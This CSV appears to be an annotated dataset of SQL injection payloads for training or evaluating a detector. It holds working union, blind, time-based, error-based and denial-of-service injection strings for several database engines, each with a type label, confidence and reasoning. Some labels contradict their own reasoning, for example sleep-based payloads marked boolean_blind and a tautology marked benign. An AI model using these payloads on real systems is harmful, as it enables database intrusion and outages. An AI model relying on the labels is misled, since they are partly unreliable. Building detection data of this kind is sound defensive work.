id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23544,"1"" ) ) ) and sleep ( 5 ) #",time_blind,mysql,0.85,"Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql. Rule-Heuristic conflict resolved by priority: sleep function clearly indicates MySQL time-based blind SQLi attack.",2
23545,1 where 7882 = 7882,boolean_blind,generic,0.65,"Boolean equality test '7882 = 7882' shows comparison pattern. Rule priority (P3) beats Heuristic benign label. Generic DB context (no specific function).",1
23546,"-3822"" ) ) as dftp where 2817 = 2817 union all select 2817,2817,2817,2817,2817,2817#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. Clear UNION SELECT injection structure with multiple column selection.",2
23547,"-4032"" ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""olox"" = ""olox",boolean_blind,generic,0.65,"Generic SQL structure with CAST and CASE; no specific DB function. Heuristic shows boolean structure. Annotation conflict; generic classification conservative.",1
23548,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'ekqv' = 'ekqv",time_blind,oracle,0.90,"Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle. Oracle-specific time function with receive_message blocking call - strong attack indicator.",2
23549,"1"" ) as ghpx where 2873 = 2873 waitfor delay '0:0:5'--",time_blind,mssql,0.90,"Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql. MSSQL-specific time delay function with explicit '0:0:5' sleep parameter.",2
23550,"1"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""cwwv"" like ""cwwv",boolean_blind,mysql,0.65,"Conflict: Rule labels elt() as P3 (boolean_blind), but also has sleep(). Heuristic shows benign. ELT boolean check takes priority over implicit time delay.",1
23551,1'|| ( select 'pxkz' where 2207 = 2207 and ( 3020 = 3020 ) *6703 ) ||',boolean_blind,generic,0.65,"Boolean conditions with equality '2207 = 2207' and arithmetic '3020 = 3020'. No DB-specific function. Generic classification based on structure.",1
23552,"1', ( select ( case when ( 5141 = 5141 ) then ( ascii ( regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ) else 5141/ ( select 0 from ( values ( 0 ) ) ) end ) from ( values ( 0 ) ) )",heavy_query,generic,0.75,"Heuristic: DoS-style payload with 500000000 large digit. Complex nested subquery with heavy computation. Marked as heavy_query due to computational load.",1
23553,"-9014%' ) union all select 4211,4211,4211,4211,4211,4211#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with multiple hardcoded column values.",2
23554,1' ) ) rlike ( select ( case when ( 3876 = 2077 ) then 1 else 0x28 end ) ) and ( ( 'hqcz' like 'hqcz,boolean_blind,mysql,0.65,"Conflict: Rule labels rlike as P3 (boolean), Heuristic disagrees. RLIKE is MySQL-specific boolean matching. Chose boolean_blind (P3) over implied time attacks.",1
23555,"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'dfxd' like 'dfxd",error_based,oracle,0.85,"Conflict: Rule priority: 'ctxsys.drithsx' → error_based (P4) beats Heuristic. Oracle-specific error triggering function. Classification corrected by rule.",1
23556,1 ) ) ) union all select null#,union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with NULL padding for alignment.",2
23557,"1"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""uquh"" = ""uquh",boolean_blind,mysql,0.75,"Conflict: Rule labels updatexml (error_based P4), Heuristic shows boolean+heavy_query. Mixed signals: updatexml error context but ELT boolean wrapper. Conservative: boolean_blind.",1
23558,"1, ( select 9100 = ( 'qqpjq'|| ( select case 9100 when 9100 then 1 else 0 end from rdb$database ) ||'qzvzq' ) )",boolean_blind,firebird,0.65,"Both sources agree boolean_blind (P3). Uses Firebird system table rdb$database. Case statement with equality comparison.",1
23559,"1"" ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.75,"Heuristic: DoS-style with 500000000 large number. SQLite randomblob function for time delay, but marked heavy_query due to computational load.",1
23560,"1"" ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.65,"Conflict: Rule vs Heuristic. DB2 system table sysibm.systables used. Boolean structure with multi-table join for DoS. Conservative generic label.",1
23561,1'|| ( select 'dsjg' where 2402 = 2402 and 1947 = 7472--,boolean_blind,generic,0.65,"Boolean pattern match: 'and 1947 = 7472' → boolean_blind (P3). Generic context. Confidence raised from 0.5 due to clear boolean signal.",1
23562,"1' ) as mgko where 1828 = 1828 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,mysql,0.65,"MySQL make_set() boolean function. Rule marks make_set as generic, Heuristic shows boolean structure. Boolean_blind (P3) chosen.",1
23563,"1"" ) where 1807 = 1807",benign,generic,0.55,"Rule: no attack signal detected. Heuristic: basic SQL structure but 'where 1807 = 1807' is standard equality test. Very weak attack indicators. Conservative benign.",1
23564,"-1123' ) ) ) union all select 6735,6735,6735,6735,6735,6735,6735,6735#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 8 columns of same value.",2
23565,"1%' ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.90,"Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle. Oracle pipe messaging function for time-based blind attack.",2
23566,"-7815' union all select 2638,2638,2638,2638,2638--",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 5 identical columns.",2
23567,1 ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,boolean_blind,mysql,0.65,"Conflict: Rule shows sleep() (time_blind P5) but Heuristic shows boolean. Subquery with sleep is unusual structure. Conservative: use Heuristic.",1
23568,"1"" ) where 1212 = 1212 and 8475 = 5864",boolean_blind,generic,0.65,"Pattern match: 'and 8475 = 5864' → boolean_blind (P3). Confidence raised to 0.65 (from 0.50) due to clear boolean test.",1
23569,"-7950 where 9619 = 9619 union all select 9619,9619,9619,9619--",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 4 identical columns.",2
23570,"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",boolean_blind,mysql,0.65,"Conflict: Rule labels sleep() (time_blind P5), Heuristic shows boolean. Sleep in subquery is ambiguous. Conservative: boolean_blind from Heuristic.",1
